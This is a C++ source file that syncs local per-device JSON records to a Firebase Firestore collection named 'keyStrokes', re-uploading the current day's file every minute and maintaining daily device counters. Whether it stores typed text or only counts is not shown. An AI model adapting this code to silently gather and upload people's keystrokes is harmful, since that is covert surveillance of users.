#include "DBcommunication.h"
#include "Utils.h"
#include "firebase/app.h"
#include "firebase/firestore.h"
#include "firebase/auth.h"
#include "json.hpp"
#include <chrono>
#include <thread>
#include <fstream>
#include <atomic>
#include <mutex>
#include <condition_variable>


extern firebase::App* g_firebaseApp;
static firebase::firestore::Firestore* g_firestore = nullptr;

// Call once after InitializeFirebase()
void InitializeFirestore() {
    if (!g_firestore && g_firebaseApp) {
        g_firestore = firebase::firestore::Firestore::GetInstance(g_firebaseApp);
    }
}

// Small helper to wait (blocking) for a Future to complete (simple, not for production high-throughput)
template<typename T>
bool WaitForFuture(const firebase::Future<T>& future, int timeoutMs = 5000) {
    int waited = 0;
    while (future.status() == firebase::kFutureStatusPending && waited < timeoutMs) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
        waited += 10;
    }
    return future.status() == firebase::kFutureStatusComplete;
}

firebase::firestore::MapFieldValue ConvertJsonToObject(const std::string& path) {
    firebase::firestore::MapFieldValue root_map;

    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open file: " + path);
    }
    nlohmann::json j;
    try {
        file >> j;
    }
    catch (const std::exception& e) {
        throw std::runtime_error("Failed to parse JSON from file: " + path + ". Error: " + e.what());
    }

    for (auto it = j.begin(); it != j.end(); ++it) {
        const std::string& outer_key = it.key();
        const auto& inner_obj = it.value();
        firebase::firestore::MapFieldValue inner_map;

        for (auto inner_it = inner_obj.begin(); inner_it != inner_obj.end(); ++inner_it) {
            try {
                // Handle different JSON value types safely
                std::string value_str;
                if (inner_it.value().is_string()) {
                    value_str = inner_it.value().get<std::string>();
                }
                else if (inner_it.value().is_number()) {
                    value_str = std::to_string(inner_it.value().get<double>());
                }
                else if (inner_it.value().is_boolean()) {
                    value_str = inner_it.value().get<bool>() ? "true" : "false";
                }
                else if (inner_it.value().is_null()) {
                    value_str = "null";
                }
                else {
                    // For any other type, convert to string representation
                    value_str = inner_it.value().dump();
                }
                
                inner_map[inner_it.key()] = firebase::firestore::FieldValue::String(value_str);
            }
            catch (const std::exception& e) {
                // If conversion fails, skip this value or use a default
                inner_map[inner_it.key()] = firebase::firestore::FieldValue::String("error_converting_value");
            }
        }

        root_map[outer_key] = firebase::firestore::FieldValue::Map(inner_map);
    }

    return root_map;
}

bool addDocument(const std::string& path, const std::string& document, const firebase::firestore::MapFieldValue& value) {
	InitializeFirestore();
    if (!g_firestore) return false;

    auto docRef = g_firestore->Collection(path).Document(document);
	if (!docRef.is_valid()) return false;
    if (value.size() == 0) return true;

    auto future = docRef.Set(value, firebase::firestore::SetOptions::Merge());
    if (!WaitForFuture(future)) return false;
    return future.error() == 0;
}

bool updateDocument(const std::string& path, const std::string& document, const firebase::firestore::MapFieldValue& value) {
    InitializeFirestore();
    if (!g_firestore) return false;

    auto docRef = g_firestore->Collection(path).Document(document);
    if (!docRef.is_valid()) return false;
    if (value.size() == 0) return true;

    // Use Set with Merge to upsert (create if missing, merge if exists)
    auto future = docRef.Set(value, firebase::firestore::SetOptions::Merge());
    if (!WaitForFuture(future)) return false;
    return future.error() == 0;
}


std::vector<std::string> GetFilesWin(const std::string& path) {
    std::vector<std::string> files;
    std::string search_path = path + "\\*";

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path.c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Check if it's a directory and not "." or ".."
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                strcmp(fd.cFileName, ".") != 0 &&
                strcmp(fd.cFileName, "..") != 0) {
                
                // Look for JSON file inside the date folder with matching name
                std::string dateFolder = fd.cFileName;
                std::string jsonFileName = dateFolder + ".json";
                std::string fullPath = path + "\\" + dateFolder + "\\" + jsonFileName;
                
                // Check if the JSON file exists
                WIN32_FIND_DATAA jsonFd;
                HANDLE hJsonFind = FindFirstFileA(fullPath.c_str(), &jsonFd);
                if (hJsonFind != INVALID_HANDLE_VALUE) {
                    files.push_back(dateFolder + "\\" + jsonFileName);
                    FindClose(hJsonFind);
                }
            }
        } while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
    }

    return files;
}

bool verifyDocumentExists(const std::string& path) {
    InitializeFirestore();
    if (!g_firestore) return false;

    auto docRef = g_firestore->Document(path.c_str());
	auto future = docRef.Get();
    if (!WaitForFuture(future)) {
        return false;
    }
    auto& snapshot = *future.result();
	return snapshot.exists();
}

std::vector<std::string> verifyAllDocumentsExists() {
    InitializeFirestore();
    std::vector<std::string> missingDocs;

    if (!g_firestore) return missingDocs;

    std::string devicePath = getDeviceGUID();
    std::vector<std::string> paths = GetFilesWin(devicePath);

    for (const auto& path : paths) {
        // path is now in format "date\date.json" (e.g., "2024-12-19\2024-12-19.json")
        // Extract just the date part (folder name)
        std::string docName = path;
        size_t firstSlash = docName.find("\\");
        if (firstSlash != std::string::npos) {
            docName = docName.substr(0, firstSlash);
        }

        // Construct the full document path for Firestore
        std::string fullDocumentPath = "records/" + getDeviceGUID() + "/keyStrokes/" + docName;
        
        // Use the existing verifyDocumentExists function
        if (!verifyDocumentExists(fullDocumentPath)) {
            missingDocs.push_back(path);
        }
    }
    
    return missingDocs;
}

// Startup function to synchronize missing local JSON files to Firestore
// This should be called once during application startup after Firebase initialization
bool SyncMissingDocumentsToFirestore() {
    try {
        // Get list of files that don't exist in Firestore
        std::vector<std::string> missingDocs = verifyAllDocumentsExists();
        
        if (missingDocs.empty()) {
            // All documents are already synchronized
            return true;
        }
        
        bool allSynced = true;
        std::string deviceGuid = getDeviceGUID();
        
        for (const std::string& filePath : missingDocs) {
            try {
                // Convert JSON file to Firestore format
                firebase::firestore::MapFieldValue value = ConvertJsonToObject(deviceGuid + "/" + filePath);
                
                // Get document name by removing .json extension
                std::string docName = filePath;
                if (docName.size() >= 5 && docName.substr(docName.size() - 5) == ".json") {
                    docName.erase(docName.size() - 5);
                }
                
                // Upload to Firestore
                std::string collectionPath = "records/" + deviceGuid + "/keyStrokes";
                if (!addDocument(collectionPath, docName, value)) {
                    allSynced = false;
                    // Continue with other documents even if one fails
                }
            }
            catch (const std::exception& e) {
                // Log error for this specific file but continue with others
                allSynced = false;
                // Could add logging here if needed
            }
        }
        
        return allSynced;
    }
    catch (const std::exception& e) {
        // General error in the synchronization process
        return false;
    }
}

// Periodic update thread management
static std::thread g_periodicUpdateThread;
static std::atomic<bool> g_shouldStopPeriodicUpdate(false);
static std::mutex g_periodicUpdateMutex;
static std::condition_variable g_periodicUpdateCV;

// Periodic update worker function that runs in a background thread
void PeriodicUpdateWorker() {
    const std::chrono::minutes UPDATE_INTERVAL(1); // 1 minutes
    
    while (!g_shouldStopPeriodicUpdate.load()) {
        // Use condition_variable for efficient waiting
        {
            std::unique_lock<std::mutex> lock(g_periodicUpdateMutex);
            // Wait for 1 minutes or until stop is requested
            if (g_periodicUpdateCV.wait_for(lock, UPDATE_INTERVAL, 
                []() { return g_shouldStopPeriodicUpdate.load(); })) {
                // Stop was requested
                break;
            }
        }
        
        if (g_shouldStopPeriodicUpdate.load()) {
            break;
        }
        
        // Perform the periodic update
        try {
            std::string deviceGuid = getDeviceGUID();
            std::string currentDate = getCurrentDate();
            std::string todayFilePath = deviceGuid + "/" + currentDate + "/" + currentDate + ".json";
            
            // Check if today's JSON file exists
            std::ifstream testFile(todayFilePath);
            if (testFile.good()) {
                testFile.close();
                
                // Convert today's JSON to Firestore format
                firebase::firestore::MapFieldValue todayData = ConvertJsonToObject(todayFilePath);
                
                // Update today's document in Firestore
                std::string collectionPath = "records/" + deviceGuid + "/keyStrokes";
                updateDocument(collectionPath, currentDate, todayData);
                
                // Optional: Could add logging here for successful updates
            }
        }
        catch (const std::exception& e) {
            // Handle errors gracefully - don't crash the thread
            // Could add error logging here if needed
        }
    }
}

// Start the periodic update thread
bool StartPeriodicUpdates() {
    try {
        std::lock_guard<std::mutex> lock(g_periodicUpdateMutex);
        
        if (g_periodicUpdateThread.joinable()) {
            // Thread is already running
            return true;
        }
        
        g_shouldStopPeriodicUpdate.store(false);
        g_periodicUpdateThread = std::thread(PeriodicUpdateWorker);
        
        return true;
    }
    catch (const std::exception& e) {
        return false;
    }
}

// Stop the periodic update thread
void StopPeriodicUpdates() {
    try {
        {
            std::lock_guard<std::mutex> lock(g_periodicUpdateMutex);
            g_shouldStopPeriodicUpdate.store(true);
        }
        
        // Notify the condition variable to wake up the waiting thread
        g_periodicUpdateCV.notify_one();
        
        if (g_periodicUpdateThread.joinable()) {
            g_periodicUpdateThread.join();
        }
    }
    catch (const std::exception& e) {
        // Handle error gracefully
    }
}

// Manual update function - can be called to immediately update today's document
bool UpdateTodayDocumentNow() {
    try {
        std::string deviceGuid = getDeviceGUID();
        std::string currentDate = getCurrentDate();
        std::string todayFilePath = deviceGuid + "/" + currentDate + "/" + currentDate + ".json";
        
        // Check if today's JSON file exists
        std::ifstream testFile(todayFilePath);
        if (!testFile.good()) {
            // Today's file doesn't exist yet
            return false;
        }
        testFile.close();
        
        // Convert today's JSON to Firestore format
        firebase::firestore::MapFieldValue todayData = ConvertJsonToObject(todayFilePath);
        
        // Upsert today's document in Firestore
        std::string collectionPath = "records/" + deviceGuid + "/keyStrokes";
        return updateDocument(collectionPath, currentDate, todayData);
    }
    catch (const std::exception& e) {
        return false;
    }
}

// Ensure devices/{GUID}/{field} exists; initialize only if missing
bool EnsureDeviceCounterExists(const std::string& field, int64_t initialValue) {
    InitializeFirestore();
    if (!g_firestore) return false;

    const std::string deviceGuid = getDeviceGUID();
    auto docRef = g_firestore->Collection("devices").Document(deviceGuid);
    auto getFuture = docRef.Get();
    if (!WaitForFuture(getFuture)) return false;

    const auto& snapshot = *getFuture.result();
    bool shouldInit = false;

    if (!snapshot.exists()) {
        shouldInit = true;
    } else {
        auto data = snapshot.GetData();
        auto it = data.find(field);
        if (it == data.end()) {
            shouldInit = true;
        }
    }

    if (shouldInit) {
        firebase::firestore::MapFieldValue m;
        m[field] = firebase::firestore::FieldValue::Integer(initialValue);
        auto setFuture = docRef.Set(m, firebase::firestore::SetOptions::Merge());
        if (!WaitForFuture(setFuture)) return false;
        return setFuture.error() == 0;
    }

    return true;
}

// Increment devices/{GUID}/{field} by delta (creates doc/field when missing)
bool IncrementDeviceCounter(const std::string& field, int64_t delta) {
    InitializeFirestore();
    if (!g_firestore) return false;

    const std::string deviceGuid = getDeviceGUID();
    auto docRef = g_firestore->Collection("devices").Document(deviceGuid);
    auto getFuture = docRef.Get();
    if (!WaitForFuture(getFuture)) return false;

    int64_t current = 0;
    const auto& snapshot = *getFuture.result();
    if (snapshot.exists()) {
        auto data = snapshot.GetData();
        auto it = data.find(field);
        if (it != data.end()) {
            const auto& fv = it->second;
            if (fv.is_integer()) {
                current = fv.integer_value();
            } else if (fv.is_string()) {
                try { current = std::stoll(fv.string_value()); } catch (...) {}
            }
        }
    }

    const int64_t nextVal = current + delta;
    firebase::firestore::MapFieldValue m;
    m[field] = firebase::firestore::FieldValue::Integer(nextVal);
    auto setFuture = docRef.Set(m, firebase::firestore::SetOptions::Merge());
    if (!WaitForFuture(setFuture)) return false;
    return setFuture.error() == 0;
}

// Ensure devices/{GUID}/{dateField} and {counterField} are fresh for today; reset counter if date changed
bool EnsureDeviceDailyCounterFresh(const std::string& counterField, const std::string& dateField) {
    InitializeFirestore();
    if (!g_firestore) return false;

    const std::string deviceGuid = getDeviceGUID();
    const std::string today = getCurrentDate();

    auto docRef = g_firestore->Collection("devices").Document(deviceGuid);
    auto getFuture = docRef.Get();
    if (!WaitForFuture(getFuture)) return false;

    bool needReset = false;
    bool needInitDate = false;

    if (!getFuture.result()->exists()) {
        needReset = true;
        needInitDate = true;
    } else {
        auto data = getFuture.result()->GetData();
        auto itDate = data.find(dateField);
        auto itCounter = data.find(counterField);
        std::string currentDateVal;
        if (itDate != data.end() && itDate->second.is_string()) {
            currentDateVal = itDate->second.string_value();
        }
        if (currentDateVal != today) {
            needReset = true;
        } else if (itCounter == data.end()) {
            // Same day but counter missing
            needReset = true;
        }
        if (itDate == data.end()) {
            needInitDate = true;
        }
    }

    if (needReset || needInitDate) {
        firebase::firestore::MapFieldValue m;
        m[dateField] = firebase::firestore::FieldValue::String(today);
        m[counterField] = firebase::firestore::FieldValue::Integer(0);
        auto setFuture = docRef.Set(m, firebase::firestore::SetOptions::Merge());
        if (!WaitForFuture(setFuture)) return false;
        return setFuture.error() == 0;
    }

    return true;
}

// Increment daily counter, resetting if date changed
bool IncrementDeviceDailyCounter(const std::string& counterField, const std::string& dateField, int64_t delta) {
    // Ensure freshness first
    if (!EnsureDeviceDailyCounterFresh(counterField, dateField)) return false;

    InitializeFirestore();
    if (!g_firestore) return false;

    const std::string deviceGuid = getDeviceGUID();
    auto docRef = g_firestore->Collection("devices").Document(deviceGuid);
    auto getFuture = docRef.Get();
    if (!WaitForFuture(getFuture)) return false;

    int64_t current = 0;
    if (getFuture.result()->exists()) {
        auto data = getFuture.result()->GetData();
        auto it = data.find(counterField);
        if (it != data.end() && it->second.is_integer()) {
            current = it->second.integer_value();
        } else if (it != data.end() && it->second.is_string()) {
            try { current = std::stoll(it->second.string_value()); } catch (...) {}
        }
    }

    const int64_t nextVal = current + delta;
    firebase::firestore::MapFieldValue m;
    m[counterField] = firebase::firestore::FieldValue::Integer(nextVal);
    auto setFuture = docRef.Set(m, firebase::firestore::SetOptions::Merge());
    if (!WaitForFuture(setFuture)) return false;
    return setFuture.error() == 0;
}